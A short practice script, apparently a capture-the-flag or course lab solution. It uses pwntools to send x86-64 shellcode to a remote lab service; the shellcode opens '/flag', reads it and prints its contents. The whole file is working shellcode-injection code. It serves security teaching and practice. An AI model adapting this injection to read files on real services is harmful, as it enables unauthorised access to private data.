
* practice assembly code with open/read/write/exit

```
from pwn import *

def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'

    # Shellcode to open /flag and read it
    shellcode = asm('''
               XOR RAX, RAX
               MOV RAX, 0x47414C462F
               PUSH RAX
               MOV RDI, RSP


               XOR RSI, RSI
               XOR RDX, RDX
               MOV RAX, 2
               SYSCALL

               MOV RDI, RAX
               MOV RSI, RSP
               MOV RDX, 200
               XOR RAX, RAX
               SYSCALL

               MOV RDI, 1
               MOV RSI, RSP
               MOV RDX, 200
               MOV RAX, 1
               SYSCALL

               XOR RDI, RDI
               MOV RAX, 60
               SYSCALL

           ''')

    print('shellcode:', shellcode)
    p.sendlineafter(b':', shellcode)
    p.interactive()

# Example usage
interact_with_process('', '6447.lol', 26246)
```
